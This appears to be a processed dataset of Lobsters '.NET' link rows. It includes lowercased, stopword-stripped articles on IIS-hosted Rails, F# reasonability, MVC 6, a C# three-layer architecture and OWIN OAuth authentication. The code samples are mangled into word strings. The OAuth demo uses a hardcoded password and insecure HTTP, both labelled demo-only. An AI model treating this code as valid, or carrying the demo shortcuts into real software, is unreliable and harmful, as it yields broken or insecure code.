helloworld ended moving folder made app first converted folder app ii order operation eh ok rail server within c inetpubwwwrootrails make sure rail run local webrick server let ii need make sure webconfig file root folder rail app webconfig aspnet right well config ii application need go java php rail node aspnet whatever ii host basically anything lem add hello world controller edit view rail generate controller welcome index edit appviewswelcomeindexhtmlerb good measure put rail app http localhostrails rather root http localhost need tell rail fact running subdirectory change configru otherwise route would nt line railsapplicationconfigrelativeurlroot rail map railsapplicationconfigrelativeurlroot run railsapplication end make special note path encoded quot argument important quoted argument passed rubyexe process ii kick note also httpplatformport environment variable reference passed ii localhostbound high port also put foo bar theoretical environment variable might want rail app know example might add environmentvariable name railsenv value production time put standard debug logging stdout remove nt want clutter make sure iisr user write access folder want see log warningdisclaimer first example showing possible nt want go production little builtin ruby webrick web server fabio akita kindly point comment pull comment one thing careful example using rail running ruby window run rail server going spawn single process monothreaded meaning respond request time ii start receiving many request simultaneously request slow going generate long queue start timing linux put nginx reverseproxy http request unicorn puma rainbow passenger coordinate multiple ruby process unix cheap process reuses memory parent process upon forking copyonwrite memory handle simultaneous request want use jruby tomcat puma ii production window keep scrolling example using jruby trinidadtomcat puma farther page also slower machine running development might need startuptimelimit seeing ii stop ruby process take long startup xml version encoding configuration systemwebserver handler add name httpplatformhandler path verb module httpplatformhandler resourcetype unspecified requireaccess script handler httpplatform stdoutlogenabled true stdoutlogfile railslog startuptimelimit processpath c argument quot c quot server p httpplatformport b environmentvariables environmentvariable name foo value bar environmentvariables httpplatform systemwebserver configuration screenshot ruby within sysinternals process explorer application wanted show could see process tree see started process see ii service hosting ruby running rail make note command line argument well ruby rail running window machine big thanks ranjith ramachandra ranjithtweets andrew westgarth apwestgarth microsoft help webconfig value tl dr basically give tl dr version except end ii install httpplatformhandler add webconfig appropriate set run like passing port ii proxy update puma trinidad tomcat ii pointed comment silly use webrick production nt told jruby way go prod able install jruby trinidad tomcat puma get helloworld running ii hour trinidad told trinidad vogue however jruby gem install trinidad way note javahome environment variable setting also update security policy file due illegal key size error javaism otherwise worked path lined see problem path related loading wrong java version also experiment nt really need mess processesperapplications create lot individual process java take lot memory per process thrash systemy get perf running production note explicitly running prod environment xml version encoding configuration systemwebserver handler add name httpplatformhandler path verb module httpplatformhandler resourcetype unspecified requireaccess script handler httpplatform stdoutlogenabled false processesperapplication stdoutlogfile railslog startuptimelimit processpath c argument trinidad context jrubyonrails env production dir c inetpubwwwrootjrubyonrails p httpplatformport environmentvariables environmentvariable name javahome value c program environmentvariables httpplatform systemwebserver configuration work easily able get reqsec laptop minimal effort sure could better tuning better machine ok let swap trindadtomcat puma put puma gemfile bundle exec puma test worked need hook ii also add gem jrubyopenssl require false gemfile avoid weird error basically thing ii reverse proxy process manager case xml version encoding configuration systemwebserver handler add name httpplatformhandler path verb module httpplatformhandler resourcetype unspecified requireaccess script handler httpplatform stdoutlogenabled false processesperapplication stdoutlogfile railslog startuptimelimit processpath c argument puma env production dir c inetpubwwwrootjrubyonrails p httpplatformport environmentvariables environmentvariable name javahome value c program environmentvariables httpplatform systemwebserver configuration using processperapplication getting reqs easily nt know anything puma jruby assume better knew tune tested without ii puma saw essentially result ii minimal overhead ca nt measure case get process management benefit issue perf kind stuff unlikely ii httpplatformhandler maybe reverse proxy always wanted window related link sponsor big thanks infragistics sponsoring feed week responsive web design browser platform device infragistics control get supercharged performance world fastest grid download free hosting
576,Lobsters,dotnet,"C#, F#, .NET programming",Is your programming language unreasonable?,http://fsharpforfunandprofit.com/posts/is-your-language-unreasonable/,programming language unreasonable,seriously misread programming language anyway example reasonableness strength quirk make hard reason make language predictable example make language predictable object containing value equal default example make language predictable comparing object different type compiletime error example make language predictable object must initialized valid state compiletime error example immutability ftw make language predictable created object collection immutable example make language predictable null allowed missing data error must made explicit function signature programming language sort thing want baked type system day one something want retrofit year strange symbol lambda solution care language let care language let question question example contrived code carefully follow good practice write safe code without feature question telling language feature arrogant question focusing one aspect programming language limiting surely quality important question dismissing dynamic language quickly summary comment comment powered disqus blog comment powered,obvious one goal site persuade people take f seriously general purpose development language functional idiom become mainstream c added functional capability lambda linq seems like c f ironically started hear people say thing like already feature f bother switch need change wait couple year c get many f feature provide slightly better c much really worth effort move towards seems really nice even bit intimidating see practical purpose use c doubt comment made jvm ecosystem scala clojure v java java lambda post going stray away f focus c proxy mainstream language try demonstrate even functional feature world programming c never programming f start want make clear hating c happens like c much one favorite mainstream language evolved powerful consistent backwards compatible hard thing pull c perfect like mainstream oo language contains design decision amount linq lambda goodness compensate post show issue design decision cause suggest way improve language avoid going flameproof suit think might need update many people seriously misread post seems let clear saying statically typed language dynamic language saying fp language oo language saying able reason code important aspect language saying able reason code cost many developer might aware therefore one many factor consideration choosing programming language ignored due lack awareness want able reason code much easier language support feature mention fundamental paradigm oo objectidentity behaviorbased compatible hard retrofit existing oo language add quality thank programming language anyway hang around functional programmer often hear phrase want reason mean use word rather use go back mathematics logic going use simple pragmatic definition mean draw conclusion using information right front rather delve part codebase word predict behavior code looking may need understand interface component need look inside see since developer spend time looking code pretty important aspect programming course huge amount advice naming guideline formatting rule design pattern etc etc programming language help code reasonable predictable think answer yes let judge present series code fragment snippet going ask think code deliberately shown comment think reasoning thought scroll read opinion example start looking following code start variable x assigned integer dosomething called x parameter assigned x question would ask simple value var x dosomething x value var x scroll answer answer get answer figure scroll trick question code actually javascript whole thing function dosomething foo x false var x dosomething x var x yes horrible dosomething access x directly rather parameter turn boolean thing subtracting x cast false totally hate sorry mislead language wanted demonstrate annoying language behaves unpredictable way javascript useful important language one would claim reasonableness one strength fact dynamicallytyped language quirk make hard reason way thanks static typing sensible scoping rule kind thing could never happen c unless tried really hard c match type properly get compiletime error rather runtime error word c much predictable javascript score one static typing first requirement making language predictable make language predictable variable allowed change type c looking good compared javascript done update admittedly silly example retrospect could picked better one yes know one sensible would ever point still stand javascript language prevent stupid thing implicit typecasts example next example going create two instance customer class exactly data question equal create two customer var new customer j smith var new customer j smith true false scroll answer true false know depends customer class implemented code predictable look whether class implement iequatable least probably look internals class well see exactly going even issue let ask often would want instance equal often override equal method often bug caused forgetting override equal method often bug caused misimplementing gethashcode forgetting change field compare change make object equal default make reference equality testing special case add another item list make language predictable variable allowed change type object containing value equal default example next example got two object containing exactly data instance different class question equal create customer order var cust new customer j smith var order new order j smith true false custequals order scroll answer true false custequals order care almost certainly bug even comparing two different class like first place compare name id certainly object compiler error probably used wrong variable name mistake subtle bug code language let add another item list make language predictable variable allowed change type object containing value equal default comparing object different type compiletime error update many people pointed need comparing class related inheritance true course cost feature get ability compare subclass lose ability detect accidental error important practice decide wanted make clear cost associated status quo benefit example snippet going create customer instance get much basic create customer var cust new customer expected output consolewriteline custaddresscountry question expected output writeline scroll answer expected output consolewriteline custaddresscountry know depends whether address property null something tell without looking internals customer class yes know best practice constructor initialize field construction time language enforce address required make required constructor address always required make clear address property optional might missing add another item list improvement make language predictable variable allowed change type object containing value equal default comparing object different type compiletime error object must always initialized valid state compiletime error example next example going create customer add set us hashing something customer object see customer still set could possibly go wrong create customer var cust new customer j smith add set var processedcustomers new hashset customer processedcustomersadd cust process processcustomer cust set contain customer true false processedcustomerscontains cust set still contain customer end code scroll answer set contain customer processedcustomerscontains cust maybe maybe depends two thing first hash code customer depend mutable field id second processcustomer change field true hash changed customer longer appear exist set even though still somewhere might well cause subtle performance memory problem eg set cache could language prevent one way would say field property used gethashcode must immutable allowing property mutable really impractical better make entire customer class immutable instead customer class immutable processcustomer wanted make change would return new version customer code would look like create customer var cust new immutablecustomer j smith add set var processedcustomers new hashset immutablecustomer processedcustomersadd cust process return change var changedcustomer processcustomer cust true false processedcustomerscontains cust notice processcustomer line changed var changedcustomer processcustomer cust clear processcustomer changed something looking code processcustomer changed anything needed return object going back question clear implementation original version customer guaranteed still set matter processcustomer course solve issue whether new one old one set unlike implementation using mutable customer issue staring face go unnoticed accidentally immutability ftw another item list make language predictable variable allowed change type object containing value equal default comparing object different type compiletime error object must always initialized valid state compiletime error created object collection must immutable time quick joke immutability many haskell programmer take change lightbulb programmer lightbulb must also replace whole house almost done one example final example try fetch customer customerrepository create repository var repo new customerrepository find customer id var customer repogetbyid expected output consolewriteline customerid question customer repogetbyid value customerid scroll answer var customer repogetbyid expected output consolewriteline customerid depends course look method signature getbyid tell always return customer really happens customer missing repogetbyid return null throw exception tell looking code got particular null terrible thing return turncoat pretend customer assigned customer variable nary complaint compiler actually ask something blow face evil cackle unfortunately tell looking code whether null returned exception little better least typed contain information context apparent method signature exception might thrown way know sure looking internal source code maybe documentation lucky date imagine language allow null allow exception could instead answer would forced return special class might contain either customer error like create repository var repo new customerrepository find customer id return customerorerror result var customerorerror repogetbyid code processed result would test kind result handle case separately like handle case customerorerroriscustomer consolewriteline customerorerrorcustomerid customerorerroriserror consolewriteline customerorerrorerrormessage exactly approach taken functional language help language provides convenience make technique easier sum type even without approach still way go want make obvious code read technique last two item add list least make language predictable variable allowed change type object containing value equal default comparing object different type compiletime error object must always initialized valid state compiletime error created object collection must immutable null allowed missing data error must made explicit function signature could go snippet demonstrating misuse globals sideeffects casting think stop probably got idea programming language hope obvious making addition programming language help make reasonable unfortunately mainstream oo language like c unlikely add feature first would major breaking change existing code second many change go deeply grain objectoriented programming model example oo model object identity paramount course equality reference default also oo point view two object compared entirely object oo polymorphic behavior compiler need stay similarly object constructed initialized entirely object rule say allowed finally hard add nonnullable reference type statically typed oo language without also implementing initialization constraint point eric lippert said sort thing want baked type system day one something want retrofit year contrast functional programming language feature core part language example f one item list built language value allowed change type even includes implicit cast int float say record internal data equal default comparing value different type compiletime error value must initialized valid state compiletime error created value immutable default null allowed general item enforced compiler discriminated union sum type generally used return error rather using exception function signature indicates exactly possible error true working f still many caveat mutable value create throw exception may indeed deal null come nonf code thing considered code smell unusual rather general default language haskell even purer hence even reasonable f even haskell program perfect fact language reasoned perfectly still practical still language certainly reasonable others think one reason many people become enthusiastic functionalstyle code call even though full strange symbol exactly immutability lack side effect functional principle act together enforce reasonability predictability turn help reduce cognitive burden need focus code front lambda solution clear list proposed improvement nothing language enhancement lambda clever functional library word focus reasonability care language let care language let want language stop stupid thing mistake choose language allow null language b higherkinded type still allowed object null easily would pick language without hesitation question let see prempt question example contrived code carefully follow good practice write safe code without feature yes claiming post writing safe code reasoning code difference careful happen careful programming language coding guideline test ide development practice give support reasoning code question telling language feature arrogant please read carefully saying saying want able reason code much easier language support feature mention reasoning code important please feel free ignore everything said question focusing one aspect programming language limiting surely quality important yes course absolutist topic think factor comprehensive library good tooling welcoming community strength ecosystem important purpose post address specific comment mentioned beginning already feature f bother switch question dismissing dynamic language quickly first apology javascript developer dig earlier like dynamic language lot one favorite language smalltalk completely unreasonable standard talked luckily post trying persuade language general rather discussing one aspect choice question immutable data structure slow lot extra allocation going affect performance post attempting address performance impact aspect feature indeed valid question ask higher priority code quality performance decide depends context personally would go safety quality first unless compelling reason sign like summary said post trying persuade pick language based alone quite true already picked statically typed highlevel language c java clear reasonability something like important criterion language decision case hope example post might made willing consider using even language platform choice net jvm argument staying put current language eventually may true purely term feature amount future enhancement really change core design decision oo language never get rid null mutability override equality time nice f scalaclojure functional alternative require change ecosystem immediately improve code quality opinion quite low risk compared cost business usual leave issue finding skilled people training support etc another post see worried hiring comment please enable javascript view comment powered disqus blog comment powered
578,Lobsters,dotnet,"C#, F#, .NET programming",What to Expect When Expecting MVC 6,http://developer.telerik.com/featured/expect-expecting-mvc-6/,expect expecting mvc,net framework core open sourced future net aspnet vnext osx linux merger mvc web api view component taghelpers routing demystifying big k project katana kre k runtime engine kvm k version manager kpm k package manager k telerik ui ui aspnet ajax ui aspnet mvc polished professional ui seamless ux mobile support responsiveness pace innovation conclusion burning question answered,landscape net developer seen exciting change late may already heard net framework core open sourced future net modular crossplatform rather interesting aspnet vnext lead way modern modular web framework written ground powering next generation web application may hearing lot interesting thing aspnet like build run aspnet application natively osx linux future regular enterprise web application built aspnet mvc key change look forward mvc roll around article offer honest simple rundown major feature start leveraging getgo code helpful resource risk killing bullet let summarize expecting aspnet mvc merger mvc web api two prominent citizen aspnet merged one singular framework help write mvc controller web api endpoint interchangeably merger eliminates duplicate code namespace reference inside aspnet going forward mvc controller serve html markup data service use dependency injection controller regulate behavior simple poco controller mvc help provide fine grained control learn view component view component similar partial view smarter separation concern think minicontrollers render small chunk markup instead whole great repeatable feature web application like login control shopping cart tag cloud etc derive viewcomponent class use razor markup view component invoked name accept parameter learn taghelpers taghelpers help avoid context switching html markup c code similar html helper previous mvc powerful instead serverside derivative get write semantic html use custom html attribute clientside element special attribute parsed understood aspnet engine attribute name map serverside c methodsproperties get invoked learn routing routing engine used aspnet mvc web api get overhaul routing system housed standalone aspnetrouting nuget package routing system normally find matching route creates route data dispatch request handler prior dispatching request handler routing system use dependency injected constraint matching mvc route action handler also return control routing system indicating handle request instead http routing system try match next route route collection allows flexibility developer build order route collection learn demystifying big k also prepare aspnet mvc may hearing much new k command line powershell bash utility k keyword way come project katana let break important usable bit kre k runtime engine allimportant engine used bootstrap run aspnet vnext web application kre includes component like compilation system sdk tool native clr host best part multiple version kre exist side side host aspnet application learn kvm k version manager utility manages multiple version kre single machine kvm used get kre first place along necessary dependency well upgradeswitch kre version learn kpm k package manager know aspnet vnext modular web platform use package need application kpm package manager used install restore package required inside aspnet application take look projectjson file list dependency project kpm manages package involved nuget learn k aspnet vnext application environment set k command serve entry point runtime buildrun application fire web server run aspnet web application k web window k kestrel osx learn telerik ui telerik excited aspnet vnext telerik ui aspnet ajax ui aspnet mvc got covered buildingmaintaining type aspnet application road ahead unique benefit get incorporating telerik ui suite aspnet mvc application polished professional ui stop reinventing wheel telerik aspnet suite developed decade become complete toolset performant control every need trust experience seamless ux telerik ui control lightweight rendering look work flawlessly across major browser device one huge responsibility immediately shoulder addition telerik suite come professional skinsthemes customize easily mobile support responsiveness yep manager want aspnet web application work seamlessly mobile device right understand mobile find large majority telerik aspnet control support responsive behavior work perfectly mobile device variety size shape talking hardhitting lineofbusinessfriendly control like grid scheduler working effortlessly full functionality mobile device pace innovation quarterly release breakneck speed development maintaining quality see u innovating continuously ui control added recently diagram orgcharts map treemap gantt pivotgrid chart persistence framework much whatever next project telerik aspnet webformsmvc control provide biggest arsenal tool help build faster better conclusion may hearing lot buzz around aspnet vnext remember something everybody quick rundown aspnet mvc feature k utility hopefully give something cheer feature immediately usable mvc web application project doubt check free whitepaper aspnet vnext burning question answered aspnet vnext lot promise let ready
579,Lobsters,dotnet,"C#, F#, .NET programming",First C# 7 Design Notes,https://github.com/dotnet/roslyn/issues/98,first c design note,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
581,Lobsters,dotnet,"C#, F#, .NET programming",Three Layer Architecture in C# .NET,http://www.codeproject.com/Articles/36847/Three-Layer-Architecture-in-C-NET,three layer architecture c net,introduction overview tier v layer three tierlayer architecture design component demo layer window application c net dbconnection database access layer value object business logic layer presentation layer summary revision,introduction article would like cover typical three layer architecture c net useful approach coding due easy code maintenance overview first let give small overview topic would like cover article tier v layerthree tierlayer architecture design componentsdemo three layer window application c net tier v layer tier tier indicates physical separation component may mean different assembly dll exe etc server multiple server see figure data tier direction presentation tier intermediate tier called business tier mainly responsible pas data data tier presentation tier add defined business logic data separate tier functionality come know conclusion layer layer indicates logical separation component distinct namespaces class database access layer business logic layer user interface layer three tierlayer architecture design component already seen tier sum physical component separate three tier data tier business tier presentation tier data tier basically server store application data data tier content database table xml file mean storing application databusiness tier mainly working bridge data tier presentation tier data pass business tier passing presentation tier business tier sum business logic layer data access layer value object component used add business logicpresentation tier tier user interact application presentation tier content shared ui code code behind designer used represent information user figure mixture three tier three layer architecture clearly see different tier layer since component independent easily maintainable without changing whole code approach really important several developer working project module need reused another project way distribute work among developer also maintain future without much problem testing also important issue architecture considering writing test case project since like modular architecture handy testing module trace bug without going entire code demo layer window application c net let go though one module better understanding dbconnection class mainly used database activity like select update delete query database also check database connection open database connection open open connection performs database query database result received passing data table class class take database setting appconfig file really flexible manage database setting using system using systemcollectionsgeneric using systemtext using systemdata using systemdatasqlclient using systemconfiguration namespace threelayerdemocore public class dbconnection private sqldataadapter myadapter private sqlconnection conn public dbconnection myadapter new sqldataadapter conn new sqlconnection configurationmanagerconnectionstrings dbconnectionstring connectionstring private sqlconnection openconnection connstate connectionstateclosed connstate connectionstatebroken connopen return conn public datatable executeselectquery string query sqlparameter sqlparameter sqlcommand mycommand new sqlcommand datatable datatable new datatable datatable null dataset d new dataset try mycommandconnection openconnection mycommandcommandtext query mycommandparametersaddrange sqlparameter mycommandexecutenonquery myadapterselectcommand mycommand myadapterfill d datatable dstables catch sqlexception e consolewrite error connectionexecuteselectquery query query nexception estacktracetostring return null finally return datatable public bool executeinsertquery string query sqlparameter sqlparameter sqlcommand mycommand new sqlcommand try mycommandconnection openconnection mycommandcommandtext query mycommandparametersaddrange sqlparameter myadapterinsertcommand mycommand mycommandexecutenonquery catch sqlexception e consolewrite error connectionexecuteinsertquery query query nexception n estacktracetostring return false finally return true public bool executeupdatequery string query sqlparameter sqlparameter sqlcommand mycommand new sqlcommand try mycommandconnection openconnection mycommandcommandtext query mycommandparametersaddrange sqlparameter myadapterupdatecommand mycommand mycommandexecutenonquery catch sqlexception e consolewrite error connectionexecuteupdatequery query query nexception estacktracetostring return false finally return true database access layer database access layer dao build query based received parameter business logic layer pass dbconnection class execution simple return result dbconnection class business logic layer using system using systemcollectionsgeneric using systemtext using systemdata using systemdatasqlclient namespace threelayerdemocore public class userdao private dbconnection conn public userdao conn new dbconnection public datatable searchbyname string username string query stringformat select like like sqlparameter sqlparameters new sqlparameter sqlparameters new sqlparameter sqldbtypevarchar sqlparameters value converttostring username sqlparameters new sqlparameter sqldbtypevarchar sqlparameters value converttostring username return connexecuteselectquery query sqlparameters public datatable searchbyid string id string query select sqlparameter sqlparameters new sqlparameter sqlparameters new sqlparameter sqldbtypevarchar sqlparameters value converttostring id return connexecuteselectquery query sqlparameters value object value object nothing class content get set method mainly used pas data one class another directly connected business logic layer presentation layer see diagram object value set business logic layer get presentation layer using system using systemcollectionsgeneric using systemlinq using systemtext namespace threelayerdemocore public class uservo private int iduser private string firstname private string lastname private string email public uservo public int iduser get return iduser set iduser value public string firstname get return firstname set firstname value public string lastname get return lastname set lastname value public string email get return email set email value business logic layer business logic layer bus work bridge presentation layer dao user value received presentation layer passed bus result received dao row data data table format bus converting value object vo business logic layer bus important class whole architecture mainly contains business logic program whenever user want update business logic program need update class using system using systemcollectionsgeneric using systemtext using systemdata namespace threelayerdemocore public class userbus private userdao userdao public userbus userdao new userdao public uservo getuseremailbyname string name uservo uservo new uservo datatable datatable new datatable datatable userdaosearchbyname name foreach datarow dr datatablerows uservoiduser dr tostring uservofirstname dr tostring uservolastname dr tostring uservoemail dr tostring return uservo public uservo getuserbyid string id uservo uservo new uservo datatable datatable new datatable datatable userdaosearchbyid id foreach datarow dr datatablerows uservoiduser dr tostring uservofirstname dr tostring uservolastname dr tostring uservoemail dr tostring return uservo presentation layer presentation layer layer directly connected user matter also really important layer marketing purpose presentation layer mainly used getting user data passing business logic layer procedure data received value object responsible represent value object appropriate form user understand using system using systemcollectionsgeneric using systemcomponentmodel using systemdata using systemdrawing using systemlinq using systemtext using systemwindowsforms using threelayerdemocore namespace threelayerdemo public partial class frmlogin form private userbus userbus public frmlogin initializecomponent userbus new userbus private void btnsearchclick object sender eventargs e uservo uservo new uservo uservo userbusgetuseremailbyname txtusernametext uservoemail null messageboxshow match found found messageboxbuttonsok messageboxiconexclamation else messageboxshow uservoemail result messageboxbuttonsok messageboxiconinformation private void btncancelclick object sender eventargs e close summary hope explanation help beginner specially looking generic approach also method far better architecture described mostly skipping database access layer value object class making dynamically really handy maintenance case frequent database change try post near future revision initial using parameterized sql query dbconnection updateduserdao updated
582,Lobsters,dotnet,"C#, F#, .NET programming",ASP .NET Web Api: Understanding OWIN/Katana Authentication/Authorization,http://typecastexception.com/post/2015/01/19/ASPNET-Web-Api-Understanding-OWINKatana-AuthenticationAuthorization-Part-I-Concepts.aspx,asp net web api understanding owinkatana authenticationauthorization,fundamental owinkatana middleware pipeline built minimal owinbased selfhosted web api image chad miller right reserved without ground part post part ii part iii source code example application security hard roll securely hashing password complex solved problem never attempt write crypto data protection scheme oauth owner resource flow authentication model resource owner flow resource owner client authorization server resource server oauth specification basic owin katana authentication source selfhosted web api previous post opted use sql server compact edition starting point selfhosted web api project adding embedded authorization server telerik fine tool decompile configuring owin authentication adding middleware pipeline authenticating client retrieve access token authorization server incorporate robust mechanism handling http error implementing api client authenticated api call protecting resource authorize attribute accessing protected resource authenticated client request adding role claim claimsbased authorization add role claim resource owner identity next next aspnet web api owinkatana authenticationauthorization part ii model persistence additional resource item interest john google codeproject,recently looked fundamental owinkatana middleware pipeline applied learned built minimal owinbased selfhosted web api managed avoid heavy weight systemweb library ii ended pretty lightweight application however concept discussed remain valid matter hosting environment want add basic authentication minimal project image chad miller right reserved going see apply learned pull small authentication authorization component minimal web api application start implementing basic authenticationauthorization model without using component provided aspnet identity framework identity fully compatible owin authorization model used manner represents useful readyto go concrete implementation perhaps better understand structure owin authorization application security general start simple concept work way concrete implementation additional framework ground series post start concept slowly build part post examine basic oauth resource owner flow model authentication assemble basic component need implement authentication using model concerning cryptographic requirement properly hashing password persisting user information database also using identity instead implementing security using basic component available microsoftowin library part ii mock basic class needed model user data persistence model see storage user data element work fundamental level part iii replace mock object identity component provide crypto security feature rolling crypto good idea previous post objective much building understanding authentication general identity particular actually fit structure owinbased application simply mind take far reasonably using owinkatana authorization component simplified example seen underlying structure authentication authorization owinbased web api application bring identity provide concrete implementation source code example building project series post order source post make sense setting branch illustrate concept github branch web api repo far look like code api client application different repo branch look like application security hard roll implementing effective application security nontrivial exercise behind simplelooking framework apis use identity membershipauth library decade worth development best brightest mind industry throughout example looking see area mock together ridiculous method example hashing validating password reality securely hashing password complex solved problem never attempt write crypto data protection scheme even simple authentication mechanism implement brings complexity project authentication inherently complex behind simpleseeming framework api provided framework aspnet identity lie crypto logic best left unless really know said understanding piece fit dig adapt existing authorization authentication flow need application important form primary objective series oauth owner resource flow authentication model one commonly used pattern authentication web application oauth resource owner flow model fact model used web api template project visual studio going implement authentication using resource owner flow almost scratch owinbased web api application owner resource flow posit four principal actor authentication scenario resource owner example user perhaps another application client generally client application used resource owner access protected resource case client might web api client application authorization server server accepts resource owner credential generally combination form credential password user namepassword combination return encoded encrypted access token resource server server resource located protects resource unauthorized access unless valid authenticationauthorization credential supplied request overview owner resource authentication flow resource owner present set credential client client submits credential authorization server credential properly validated authorization server encoded andor encrypted access token returned client client us access token make request resource server resource server configured accept access token originate authorization server decodedecrypt token confirm identity authorization claim provided resource owner predicated resource owner properly registered authorization server noted oauth specification requires transaction involving transmission passwordcredentials must conducted using ssltsl http implementation v web api project template put slight twist embedding authentication server within resource server embedded authentication server variant owner resource flow basic owin katana authentication put together stripped example demonstrate piece fit together clutter thing higherlevel component additional database concern get started pull source selfhosted web api built previous post going pick left project add basic authentication component recall assembled fairly minimal owinbased web api consisting owin startup class simple company model class companiescontroller application consolebased application standard entry point main method program class project decided since selfhosting application would keep data store inprocess use local filebased data store opted use sql server compact edition since would readily work entity framework codefirst database generation therefore also added applicationdbcontext review existing project component make change starting point selfhosted web api project first owin startup class owin startup class minimal selfhosted web api project add following using using owin using systemwebhttp namespace minimalowinwebapiselfhost public class startup method required katana public void configuration iappbuilder app var webapiconfiguration configurewebapi use extension method provided webapiowin library appusewebapi webapiconfiguration private httpconfiguration configurewebapi var config new httpconfiguration configroutesmaphttproute defaultapi api controller id new id routeparameteroptional return config simple company model suitably located model folder project original company model class using system using systemcollectionsgeneric using systemlinq using systemtext using systemthreadingtasks add using using systemcomponentmodeldataannotations namespace minimalowinwebapiselfhostmodels public class company add key attribute key public int id get set public string name get set original companiescontroller class suitably located controller folder within project original company controller public class companiescontroller apicontroller applicationdbcontext db new applicationdbcontext public ienumerable company get return dbcompanies public async task company get int id var company await dbcompaniesfirstordefaultasync c cid id company null throw new httpresponseexception systemnethttpstatuscodenotfound return company public async task ihttpactionresult post company company company null return badrequest argument null var companyexists await dbcompaniesanyasync c cid companyid companyexists return badrequest exists dbcompaniesadd company await dbsavechangesasync return ok public async task ihttpactionresult put company company company null return badrequest argument null var existing await dbcompaniesfirstordefaultasync c cid companyid existing null return notfound existingname companyname await dbsavechangesasync return ok public async task ihttpactionresult delete int id var company await dbcompaniesfirstordefaultasync c cid id company null return notfound dbcompaniesremove company await dbsavechangesasync return ok also model folder applicationdbcontextcs file actually contains applicationdbcontext well dbinitializer moment derives dropdatabasecreatealways database blown away reseeded time application run original applicationdbcontext dbinitializer using system using systemcollectionsgeneric using systemlinq using systemtext using systemthreadingtasks add using using systemdataentity using microsoftaspnetidentity using microsoftaspnetidentityentityframework namespace minimalowinwebapiselfhostmodels public class applicationdbcontext dbcontext public applicationdbcontext base mydatabase static applicationdbcontext databasesetinitializer new applicationdbinitializer public idbset company company get set public class applicationdbinitializer dropcreatedatabasealways applicationdbcontext protected override void seed applicationdbcontext context contextcompaniesadd new company name microsoft contextcompaniesadd new company name apple contextcompaniesadd new company name google contextsavechanges actually changed code original applicationdbcontext since previous post added static constructor set database initializer context instantiated call initializer first time hit database much cleaner solution previously database initialization main method program class original programcs file slightly modified using system using systemcollectionsgeneric using systemlinq using systemtext using systemthreadingtasks add reference using microsoftowinhosting using systemdataentity using minimalowinwebapiselfhostmodels namespace minimalowinwebapiselfhost class program static void main string args specify uri use local host string baseuri http consolewriteline starting web server webappstart startup baseuri consolewriteline server running press enter quit baseuri consolereadline know left let see implementing basic example oauth resource owner flow model authentication microsoftaspnetidentityowin nuget package includes everything need implement basic example resource owner flow even though dealing identity directly yet pull microsoftaspnetidentityowin package project add microsoft aspnet identity owin nuget package pm installpackage microsoftaspnetidentityowin pre ready get adding embedded authorization server key resource owner flow authorization server case authorization server actually contained within web api application perform function would hosted separately microsoftowinsecurityoauth library defines default implementation ioauthauthorizationserverprovider oauthauthorizationserverprovider allows u derive custom implementation application recognize used visual studio web api project template add new folder project oauthserverprovider add class as follows add applicationoauthserverprovider class using system using systemcollectionsgeneric using systemlinq using systemtext using systemthreadingtasks add using using microsoftowinsecurity using microsoftowinsecurityoauth using systemsecurityclaims using minimalowinwebapiselfhostmodels namespace minimalowinwebapiselfhostoauthserverprovider public class applicationoauthserverprovider oauthauthorizationserverprovider public override async task validateclientauthentication oauthvalidateclientauthenticationcontext context call required using client authentication validate move await taskfromresult contextvalidated public override async task grantresourceownercredentials oauthgrantresourceownercredentialscontext context demo pretend sort real checking contextpassword password contextseterror invalidgrant user name password incorrect contextrejected return create retrieve claimsidentity represent authenticated user claimsidentity identity new claimsidentity contextoptionsauthenticationtype identityaddclaim new claim username contextusername identity info ultimately encoded access token result call contextvalidated identity see overriding two method available oauthauthorizationserverprovider first validateclientauthentication necessary even though case validating client application although could wanted simply calling validated clientvalidationcontext moving complex scenario one stronger security required might authenticate client well resource owner meat potato authentication process occurs grantresourceownercredentials method part example keeping simple hacked authentication process basically compare password passed hardcoded string value password check fails error set authentication fails reality course would shortly implement complex check user credential though without distracting u overall structure thing credential check succeeds instance claimsidentity created represent user data including claim user adding user name single claim calling validated grantresourceownercredentials context call validated ultimately result owin middleware encoding claimsidentity data access token happens context microsoftowin implementation complex beyond scope article want dig deeper grab copy telerik fine tool decompile suffice say claimsidentity information encrypted private key generally always machine key machine server running encrypted access token added body outgoing http response configuring owin authentication adding middleware pipeline actual authorization server place let configure owin startup class authenticate incoming request add new method configureauth startup class check make sure added following using code startup add configureauth method owin startup class using system add following using using owin using systemwebhttp using minimalowinwebapiselfhostmodels using minimalowinwebapiselfhostoauthserverprovider using microsoftowinsecurityoauth using microsoftowin namespace minimalowinwebapiselfhost public class startup method required katana public void configuration iappbuilder app configureauth app var webapiconfiguration configurewebapi appusewebapi webapiconfiguration private void configureauth iappbuilder app var oauthoptions new oauthauthorizationserveroptions tokenendpointpath new pathstring token provider new applicationoauthserverprovider accesstokenexpiretimespan timespanfromdays demo allowinsecurehttp true appuseoauthauthorizationserver oauthoptions appuseoauthbearerauthentication new oauthbearerauthenticationoptions private httpconfiguration configurewebapi var config new httpconfiguration configroutesmaphttproute defaultapi api controller id new id routeparameteroptional return config lot going configureauth method first initialize instance oauthauthorizationserveroptions part initialization see set token endpoint well assign new instance applicationoauthauthenticationserverprovider class provider property option object set expiry token issue explicitly allow authorization server allow insecure http connection note last strictly demo purpose wild would definitely want connect authorization server using secure ssltls protocol http since transporting user credential clear authorization server option configured see standard extension method commonly used add middleware iappbuilder pas server option useauthorizationserver indicate want return bearer token useoauthbearerauthentication case passing default implementation oauthbearerauthenticationoptions although could derive customize needed server added option object specifies configuration item passed middleware pipeline authenticating client retrieve access token authorization server previous post put together crude effective api client application exercise api post going basically rewrite client application first add new class apiclient class class responsible submitting credential web api obtaining dictionary string string containing deserialized response body includes access token additional information authentication process apiclient class using system using systemcollectionsgeneric using systemlinq using systemtext using systemthreadingtasks add using using systemnethttp add identitytoken deserialization using newtonsoftjson namespace minimalowinwebapiclient public class apiclientprovider string hosturi public string accesstoken get private set public apiclientprovider string hosturi hosturi hosturi public async task dictionary string string gettokendictionary string username string password httpresponsemessage response var pair new list keyvaluepair string string new keyvaluepair string string granttype password new keyvaluepair string string username username new keyvaluepair string string password password var content new formurlencodedcontent pair using var client new httpclient var tokenendpoint new uri new uri hosturi token response await clientpostasync tokenendpoint content var responsecontent await responsecontentreadasstringasync responseissuccessstatuscode throw new exception stringformat error responsecontent return gettokendictionary responsecontent private dictionary string string gettokendictionary string responsecontent dictionary string string tokendictionary jsonconvertdeserializeobject dictionary string string responsecontent return tokendictionary place reimplement client program class like client program class using system using 